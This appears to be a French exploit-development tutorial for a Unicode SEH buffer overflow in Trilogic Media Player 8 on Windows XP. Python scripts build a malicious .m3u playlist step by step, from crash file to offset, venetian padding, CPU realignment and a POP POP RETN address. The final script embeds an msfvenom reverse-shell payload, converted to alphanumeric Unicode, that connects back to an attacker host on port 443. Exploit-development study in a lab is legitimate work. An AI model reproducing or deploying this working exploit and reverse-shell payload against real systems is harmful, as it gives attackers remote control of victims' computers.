# Windows dev exploit Unicode SEH - Trilogic Media Player 8

Prérequis :

http://www.exploit-db.com/exploits/14673/

* [Trilogic Media Player 8](https://www.exploit-db.com/apps/4e68d370d54180157bf1b578407848f4-triomp8setup.exe)
* [Windows XP SP3 x86](https://www.mes-vms.fr/machine-virtuelle-windows-xp-professionnel-sp3-32bits-en-francais/)
* [Immunity Debugger](https://www.immunityinc.com/products/debugger/)
* [Mona](https://github.com/corelan/mona)

1. Fuzzing
2. Identifier l'exception
3. Créer un pattern
4. Localiser le SEH
5. Venetian padding
6. Trouver un POP POP RETN (Unicode)
7. Réalignement du CPU
8. Ajout d'un padding pour entrer dans notre shellcode
9. Génération d'un shellcode
10. Conversion en Unicode
11. Générer l'exploit

## Etape 1 : Fuzzing

A faire


## Etape 2 : Identifier l'exception

On génère le premier crash

```PYTHON
#!/usr/bin/python
 
filename="crash.m3u"
 
buffer = "A"*5000
 
textfile = open(filename , 'w')
textfile.write(buffer)
textfile.close()
````

L'EIP est bien écrasé par nos "A".

![](images/crash.png)

On voit que on a 0041 0041 0041 0041

## Etape 3 : Créer un pattern 

On crée un pattern d'une longueur de 5000 (taille équivalente à notre payload envoyée lors du crash) :

```BASH
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 5000
```

## Etape 4 : Localiser le SEH

On trouve la position du SEH dans immunity debugger avec mona : 

```
!mona findmsp
```
![](images/locate_eip.png)

On trouver le SEH à l'offset 536.

On a junk + nSEH + SEH + junk : "A" * 536 + nSEH + SEH + "B" * (5000 - 506 - 4)


## Etape 5 : Venetian padding

Il faut ensuite trouver une instruction qui permet d'annuler les 00 ajouté dans le SEH (venetian padding).

Les instructions suivantes ont la faculté d'absorber les \x00 qui les suivent :
```
006E00     ADD BYTE PTR DS:[ESI],CH
006F00     ADD BYTE PTR DS:[EDI],CH
007000     ADD BYTE PTR DS:[EAX],DH
007100     ADD BYTE PTR DS:[ECX],DH
007200     ADD BYTE PTR DS:[EDX],DH
007300     ADD BYTE PTR DS:[EBX],DH
```

Donc dans notre nseh on va mettre : /x41/x71

## Etape 6 : Trouver un POP POP RETN (Unicode)

Ensuite il faut chercher un seh en unicode

```BASH
!mona seh -cp unicode
```

Dans le fichier seh.txt présent dans le dossier d'immunity debugger on trouve :

```
0x004100f2 : pop esi # pop ebx # ret 0x04 | startnull,unicode {PAGE_EXECUTE_READWRITE} [triomp8.exe] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v8.0.0.0 (C:\Program Files\Triologic\Triologic Media Player\triomp8.exe)
```

On obtient alors :

```PYTHON
#!/usr/bin/python

filename="bon2_seh.m3u"
buffer = "\x90"*536+"\x41\x71"+"\x72\x41"+"B"*4462
textfile = open(filename,'w')
textfile.write(buffer)
textfile.close()
```

## Etape 7 : Réalignement du CPU

Ensuite il est nécessaire de réaligner le CPU sur notre shellcode (Attention à ne pas oublier le venetian padding).

Il faut incrémenter le registre le plus proche de nous, dans ce cas ci c'est **EBP**. Nous allons donc faire un EBP+300 en assembleur.

Chaque instruction est séparé par un venetian padding pour supprimer les 00 superflus.

```
"\x55"               #push the value of EBP on to the stack
"\x71"               #Venetian Padding
"\x58"               #take the value of EBP and pop it into EAX
"\x71"               #Venetian Padding
"\x05\x20\x11"       #add eax,0x11002000  \
"\x71"               #Venetian Padding     |> the net sum will add 300 to the value in EAX
"\x2d\x17\x11"       #sub eax,0x11001700  /
"\x71"               #Venetian Padding
"\x50"               #push the new value of EAX onto the stack (points to our buffer)
"\x71"               #Venetian Padding
"\xC3"               #redirect execution flow to the pointer at the top of the stack ==> EAX
```

```PYTHON
#!/usr/bin/python

filename="align.m3u"

seh ="\x41\x71"+"\xF2\x41"

align = (
"\x55"
"\x71"
"\x58"
"\x71"
"\x05\x20\x11"
"\x71"
"\x2d\x17\x11"
"\x71"
"\x50"
"\x71"
"\xC3")

buffer = "\x90"*536+seh+align+"B"*4462
textfile = open(filename,'w')
textfile.write(buffer)
textfile.close()
```

![](images/align_cpu.png)

Bien penser à faire shift + f9 pour passer la première exception dans immunity debugger.

On se retrouve bien dans nos B (\x42).

## Etape 8 : Ajout d'un padding pour entrer dans notre shellcode

Il est nécessaire d'ajouter du padding pour pouvoir accéder à notre shellcode. Pour ce faire nous allons ajouter après notre alignement : ("\x58") * 117

On obtient alors : junk + nseh +seh + align + padding + shellcode

## Etape 9 : Génération d'un shellcode

Pour générer notre exploit nous allons utiliser msfvenom avec une sortie en raw.

```BASH
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.85.128 LPORT=443 -f raw -a x86 > shellcode.raw
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 324 bytes
```


## Etape 10 : Conversion en Unicode

Il faut convertir notre shellcode en unicode pour qu'il fonctionne correctement. Pour cela vous pouvez utiliser le script ![](scripts/alpha2.c) (le compiler au préalable avec gcc)

```BASH
root@kali:~/exploit/unicode# ./alpha2 eax --unicode --uppercase < shellcode.raw 

PPYAIAIAIAIAQATAXAZAPA3QADAZABARALAYAIAQAIAQAPA5AAAPAZ1AI1AIAIAJ11AIAIAXA58AAPAZABABQI1AIQIAIQI1111AIAJQI1AYAZBABABABAB30APB944JBKLYXSRKPKPKP1P4I9UNQWPQTDKPPP04KQBLL4KR2LT4KBRO8LO87OZMVNQKOVLOLQQSLKRNLMPWQXOLMKQY7YRKB1B0WTK0RLPTKPJOLTK0LLQRXZCQ8KQXQ0QTKQIMPKQYCDKOYMH9SNZOY4K04TKM18VP1KOFLWQXOLMKQ8GP8K0BUKFKSSMJXOK3MO4SEZDB8TK28MTKQ8S1VTKLLPKTKB8MLM1XS4KKT4KKQZ0SYPDO4MT1KQKQQPY0ZPQKOYP1OQOQJDKLRJK4MQMS8P3P2KPKP2H3GD3OB1OPTS80LSGO6LGKOJ5H8TPKQKPKPO97TPTPP38O93PRKKPKOHU20200PR0OP20OPPPS8JJLOYOK0KOHU4WRJLEQXGP6HQE502HKRKPKQGKTIIVQZLPPVQGS8V9UUSDQQKOJ5CUWPBTLLKOPNLH45JLRHJPGEG2PVKOYE38QS2M34M0DIYSB727PWNQL6RJN2R9QF9RKMQVHGOTMTOLKQKQ4MOTNDLPWVM014R4PPPVR6PVPF0VPNB6PV0SR61XRY8LOO4FKOXUSY9PPN1FQ6KONP1XM857MMS0KO8UGKJPX56B0V38UVTUWM5MKOJ5OLLF3LKZSPKKYP2UKUWKOWMCRRBOQZM0R3KO8UA
```

## Etape 11 : Générer l'exploit

Pour générer notre exploit il faut concaténer tout ce que l'on à généré au préalable :

```PYTHON
#!/usr/bin/python

filename="exploit.m3u"

seh ="\x41\x71"+"\xF2\x41"

align = (
"\x55"
"\x71"
"\x58"
"\x71"
"\x05\x20\x11"
"\x71"
"\x2d\x17\x11"
"\x71"
"\x50"
"\x71"
"\xC3")

shellcode="PPYAIAIAIAIAQATAXAZAPA3QADAZABARALAYAIAQAIAQAPA5AAAPAZ1AI1AIAIAJ11AIAIAXA58AAPAZABABQI1AIQIAIQI1111AIAJQI1AYAZBABABABAB30APB944JBKLYXSRKPKPKP1P4I9UNQWPQTDKPPP04KQBLL4KR2LT4KBRO8LO87OZMVNQKOVLOLQQSLKRNLMPWQXOLMKQY7YRKB1B0WTK0RLPTKPJOLTK0LLQRXZCQ8KQXQ0QTKQIMPKQYCDKOYMH9SNZOY4K04TKM18VP1KOFLWQXOLMKQ8GP8K0BUKFKSSMJXOK3MO4SEZDB8TK28MTKQ8S1VTKLLPKTKB8MLM1XS4KKT4KKQZ0SYPDO4MT1KQKQQPY0ZPQKOYP1OQOQJDKLRJK4MQMS8P3P2KPKP2H3GD3OB1OPTS80LSGO6LGKOJ5H8TPKQKPKPO97TPTPP38O93PRKKPKOHU20200PR0OP20OPPPS8JJLOYOK0KOHU4WRJLEQXGP6HQE502HKRKPKQGKTIIVQZLPPVQGS8V9UUSDQQKOJ5CUWPBTLLKOPNLH45JLRHJPGEG2PVKOYE38QS2M34M0DIYSB727PWNQL6RJN2R9QF9RKMQVHGOTMTOLKQKQ4MOTNDLPWVM014R4PPPVR6PVPF0VPNB6PV0SR61XRY8LOO4FKOXUSY9PPN1FQ6KONP1XM857MMS0KO8UGKJPX56B0V38UVTUWM5MKOJ5OLLF3LKZSPKKYP2UKUWKOWMCRRBOQZM0R3KO8UA"

filler ="\x58"*117

full=seh+align+filler+shellcode
buffer = "\x90"*536+full+"B"*(4466-len(full))
textfile = open(filename,'w')
textfile.write(buffer)
textfile.close()
```